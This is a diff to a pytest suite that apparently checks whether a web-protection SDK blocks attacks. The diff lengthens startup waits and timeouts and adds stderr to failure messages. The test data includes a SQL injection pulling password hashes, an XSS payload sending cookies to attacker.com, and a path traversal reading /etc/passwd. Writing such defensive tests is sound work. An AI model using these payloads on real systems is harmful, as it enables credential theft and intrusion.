@@ -38,7 +38,7 @@ def run_servers():
 
     # Wait for control plane health
     cp_ready = False
-    for _ in range(30):
+    for _ in range(60):
         try:
             r = httpx.get(f"{CONTROL_PLANE_URL}/health", timeout=0.5)
             if r.status_code == 200:
@@ -48,8 +48,9 @@ def run_servers():
             time.sleep(0.3)
 
     if not cp_ready:
+        err = cp_proc.stderr.read().decode("utf-8", errors="replace") if cp_proc.stderr else ""
         cp_proc.terminate()
-        pytest.fail("Control plane failed to start within timeout.")
+        pytest.fail(f"Control plane failed to start within timeout: {err}")
 
     # 2. Start Target App on port 3005
     target_env = os.environ.copy()
@@ -67,7 +68,7 @@ def run_servers():
 
     # Wait for target app health
     target_ready = False
-    for _ in range(30):
+    for _ in range(60):
         try:
             r = httpx.get(f"{TARGET_URL}/api/health", timeout=0.5)
             if r.status_code == 200:
@@ -77,9 +78,10 @@ def run_servers():
             time.sleep(0.3)
 
     if not target_ready:
+        err = target_proc.stderr.read().decode("utf-8", errors="replace") if target_proc.stderr else ""
         target_proc.terminate()
         cp_proc.terminate()
-        pytest.fail("Sample target app failed to start within timeout.")
+        pytest.fail(f"Sample target app failed to start within timeout: {err}")
 
     yield TARGET_URL
 
@@ -100,7 +102,7 @@ def run_servers():
 def test_benign_product_search(run_servers):
     """Verify legitimate searches pass through the SDK with HTTP 200 OK."""
     url = run_servers
-    res = httpx.get(f"{url}/api/catalog/search?q=router", timeout=2.0)
+    res = httpx.get(f"{url}/api/catalog/search?q=router", timeout=5.0)
     assert res.status_code == 200
     data = res.json()
     assert data["status"] == "success"
@@ -112,7 +114,7 @@ def test_sqli_attack_blocked_with_403(run_servers):
     """Verify SQL injection against catalog search is blocked with HTTP 403 Forbidden."""
     url = run_servers
     sqli_payload = "1' UNION SELECT 1,2,password_hash FROM users--"
-    res = httpx.get(f"{url}/api/catalog/search", params={"q": sqli_payload}, timeout=2.0)
+    res = httpx.get(f"{url}/api/catalog/search", params={"q": sqli_payload}, timeout=5.0)
     assert res.status_code == 403
     data = res.json()
     assert "error" in data
@@ -129,7 +131,7 @@ def test_xss_attack_blocked_with_403(run_servers):
         "rating": 1,
         "comment": "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>"
     }
-    res = httpx.post(f"{url}/api/reviews", json=xss_payload, timeout=2.0)
+    res = httpx.post(f"{url}/api/reviews", json=xss_payload, timeout=5.0)
     assert res.status_code == 403
     data = res.json()
     assert "Access Denied" in data["error"]
@@ -138,7 +140,7 @@ def test_xss_attack_blocked_with_403(run_servers):
 def test_path_traversal_blocked_with_403(run_servers):
     """Verify LFI / Path Traversal attempt is blocked with HTTP 403 Forbidden."""
     url = run_servers
-    res = httpx.get(f"{url}/api/files/view?doc=../../../../etc/passwd", timeout=2.0)
+    res = httpx.get(f"{url}/api/files/view?doc=../../../../etc/passwd", timeout=5.0)
     assert res.status_code == 403
     data = res.json()
     assert "Access Denied" in data["error"]
